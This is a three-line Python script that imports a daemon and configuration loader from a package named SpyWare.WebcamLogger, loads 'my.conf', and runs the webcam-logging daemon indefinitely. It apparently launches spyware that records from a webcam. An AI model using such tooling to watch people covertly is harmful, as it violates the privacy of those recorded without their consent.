from SpyWare.WebcamLogger import Daemon, webcamConfig

webcamConfig("my.conf")

Daemon().run_for_ever()
